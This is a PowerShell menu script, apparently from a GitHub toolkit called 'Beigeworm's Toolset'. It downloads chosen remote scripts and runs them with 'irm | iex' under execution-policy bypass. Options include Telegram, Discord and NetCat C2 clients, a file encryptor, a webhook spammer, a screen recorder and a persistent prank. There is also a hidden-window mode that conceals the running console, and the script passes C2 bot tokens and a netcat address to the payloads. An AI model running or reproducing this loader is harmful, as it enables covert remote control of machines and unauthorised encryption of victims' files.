<#
======================================= Beigeworm's Toolset ==========================================

https://is.gd/bwtool

SYNOPSIS
All useful tools in one place.
A selection of Powershell tools from this repo can be ran from this script.

USAGE
1. Replace the URLS and TOKENS below. (they can also be added by running the script)
2. Run the script and follow options in the console

INFO
Closing this script will NOT close any scripts that were started from this script.
Any background/hidden scripts eg. C2 clients will keep running.

#>

# Uncomment below (or def)
#$hookurl = "DISCORD_WEBHOOK_HERE"
#$ch = "PASTEBIN_URL_HERE"
#$tg = "TELEGRAM_BOT_TOKEN"
#$NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port

$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(80, 35)
[Console]::Title = "Beigeworm`'s Toolset"
$Option = ''

function Header {
cls
$Header = "==============================================================================
=   __________       .__            ___________           .__                =
=   \______   \ ____ |__| ____   ___\__    ___/___   ____ |  |   ______      =
=    |    |  _// __ \|  |/ ___\_/ __ \|    | /  _ \ /  _ \|  |  /  ___/      =
=    |    |   \  ___/|  / /_/  >  ___/|    |(  <_> |  <_> )  |__\___ \       =
=    |______  /\___  >__\___  / \___  >____| \____/ \____/|____/____  >      =
=           \/     \/  /_____/      \/                              \/       =
==============================================================================`n"
Write-Host "$header" -ForegroundColor Green
}

$list = "==============================================================================
=                                                                            =
= C2 Clients                                                                 =
= 1.  Telegram C2 Client                   System Tools                      =
= 2.  Discord C2 Client                    15. Environment Variable Encoder  =
= 3.  NetCat C2 Client                     16. Find Text string in Files     =
= 4.  LAN Toolset                          17. Minecraft Server Scanner      =
=                                          18. Console Task Manager          =
= Encryption                               19. Dummy Folder Creator          =
= 5.  Encryptor                            20. Mouse Recorder / Player       =
= 6.  Decryptor                            21. Matrix Cascade                =
=                                          22. Github Repo Search & Invoke   =
= GUI Tools                                23. Global Powershell Logging     =
= 7.  Filetype Finder                      24. Terminal Shortcut Creator     =
= 8.  Screen Recorder                      25. Text Cipher Tool              =
= 9.  Network Enumeration                  26. System Information to File    =
= 10. Microphone Muter                     27. Day/Night Bliss Wallpaper     =
= 11. Webhook Spammer                      28. Environment Variable Encoder  =
= 12. Social Search                                                          =
= 13. GDI effects                          Pranks                            =
= 14. Mouse Recorder                       28. Windows Idiot Prank           =
= 15. System Metrics                       29. Memz in Powershell            =
=                                          30. Persistant Goose              =
= 99. Close Program                                                          =
= 00. Token and URL setup                                                    =
=                                                                            = 
==============================================================================
"

Function EnterTokens{
    if (($hookurl.Length -eq 0) -or ($ch.Length -eq 0) -or ($tg.Length -eq 0) -or ($tk.Length -eq 0) -or ($NCurl.Length -eq 0)){Write-Host "Missing Entries Found." -ForegroundColor Red;sleep 1;cls;Header;Write-Host "Please enter the missing URLs and API Tokens" -ForegroundColor Yellow;Write-Host "You can leave these empty however functionality will be limited..`n" -ForegroundColor DarkGray;sleep 1}
    if ($hookurl.Length -eq 0){$hookurl = Read-Host "Enter a Discord Webhook ";Write-Host "Discord Webhook Set." -ForegroundColor Green}
    if ($tk.Length -eq 0){$tk = Read-Host "Enter Discord Bot Token ";Write-Host "Discord Bot Token Set." -ForegroundColor Green}
    if ($ch.Length -eq 0){$ch = Read-Host "Enter a Discord Channel ID ";Write-Host "Discord Channel ID Set." -ForegroundColor Green}
    if ($tg.Length -eq 0){$tg = Read-Host "Enter a Telegram Bot API Token ";Write-Host "Telegram API Token Set." -ForegroundColor Green}
    if ($NCurl.Length -eq 0){$NCurl = Read-Host "Enter an IPv4 address for Netcat";Write-Host "IPv4 address Set." -ForegroundColor Green}
}

Header
sleep 1
Write-Host "Checking URLs and API Tokens" -ForegroundColor Yellow
sleep 1
EnterTokens

While ($true){
cls
Header
Write-Host "$list" -ForegroundColor Green
$Option = Read-Host "Choose an option "
$BaseURL = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main"
$PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"

    if ($Option -eq '1'){$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
    if ($Option -eq '2'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
    if ($Option -eq '3'){$url = "$BaseURL/NC-Func.ps1"}
    if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
    if ($Option -eq '5'){$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
    if ($Option -eq '6'){$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
    if ($Option -eq '7'){$url = "$BaseURL/GUI%20Tools/Search-Folders-For-Filetypes-GUI.ps1"}
    if ($Option -eq '8'){$url = "$BaseURL/GUI%20Tools/Record-Screen-GUI.ps1"}
    if ($Option -eq '9'){$url = "$BaseURL/GUI%20Tools/Network%20Enumeration%20GUI.ps1"}
    if ($Option -eq '10'){$url = "$BaseURL/GUI%20Tools/Mute%20Microphone%20GUI.ps1"}
    if ($Option -eq '11'){$url = "$BaseURL/GUI%20Tools/Discord%20Webhook%20Spammer%20GUI.ps1"}
    if ($Option -eq '12'){$url = "$BaseURL/GUI%20Tools/Social%20Search%20GUI.ps1"}
    if ($Option -eq '13'){$url = "$BaseURL/GUI%20Tools/Desktop-GDI-Efects-GUI.ps1"}
    if ($Option -eq '14'){$url = "$BaseURL/GUI%20Tools/Mouse-Recorder-GUI.ps1"}
    if ($Option -eq '15'){$url = "$BaseURL/GUI%20Tools/System-Metrics-GUI.ps1"}
    
    if ($Option -eq '16'){$url = "$BaseURL/Misc/Find%20Text%20string%20in%20Files.ps1"}
    if ($Option -eq '17'){$url = "$BaseURL/Misc/Minecraft-Server-Scanner-and-Server-Info.ps1"}
    if ($Option -eq '18'){$url = "$BaseURL/Misc/Console-Task-Manager.ps1"}
    if ($Option -eq '19'){$url = "$BaseURL/Misc/Dummy-Folder-Creator.ps1"}
    if ($Option -eq '20'){$url = "$BaseURL/Misc/Mouse-Clicks-Recorder.ps1"}
    if ($Option -eq '21'){$url = "$BaseURL/Misc/Matrix-Cascade-in-Powershell.ps1"}
    if ($Option -eq '22'){$url = "$BaseURL/Misc/Github-Repo-PS-Search-and-Invoke.ps1"}
    if ($Option -eq '23'){$url = "$BaseURL/Misc/Global-PS-Logging.ps1"}
    if ($Option -eq '24'){$url = "$BaseURL/Misc/Terminal-Shortcut-Creator.ps1"}
    if ($Option -eq '25'){$url = "$BaseURL/Misc/Text-Cipher-Tool.ps1"}
    if ($Option -eq '26'){$url = "$BaseURL/Information%20Enumeration/Sys-Info-to-File.ps1"}
    if ($Option -eq '27'){$url = "$BaseURL/Misc/Day-Night-Bliss-Wallpaper-Schedulded.ps1"}
    if ($Option -eq '28'){$url = "$BaseURL/Misc/Environment-Variable-Encoder.ps1"}
    
    if ($Option -eq '29'){$url = "$BaseURL/Pranks/Windows-Idiot-Prank.ps1"}
    if ($Option -eq '30'){$url = "$BaseURL/Pranks/PoshMEMZ-Prank.ps1"}
    if ($Option -eq '31'){$url = "$BaseURL/Pranks/Persistant-Goose.ps1"}


    if ($Option -eq '99'){Write-Host "Closing Script";sleep 1; exit}
    else{Write-Host "No valid option selected."}

    while ($Option -ne '99'){
        Header
        $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
        Write-Host "Selected Script URL - $url" -ForegroundColor Cyan
        Write-Host "Do NOT Continue Unless You Have Reviewed The Script!" -ForegroundColor Red
        Pause

        if ($Option){

            if ($Option -eq '00'){Write-Host "Entering Token and URL setup.." -ForegroundColor Yellow;sleep 1;EnterTokens;break}

            $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
            
            If ($hidden -eq 'y'){
                Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$hookurl = `'$hookurl`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
                break
            }
            If ($hidden -eq 'n'){
                Start-Process PowerShell.exe -ArgumentList ("-Ep Bypass -C `$tg = `'$tg`' ; `$tk = `'$tk`' ; `$hookurl = `'$hookurl`' ; `$ch = `'$ch`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
                break
            }
            else{
                Write-Host "No valid option selected" -ForegroundColor Red
                break  
            }
        }
        else{
            Write-Host "No valid option selected" -ForegroundColor Red 
            break
        }
        break

    }
sleep 1
}

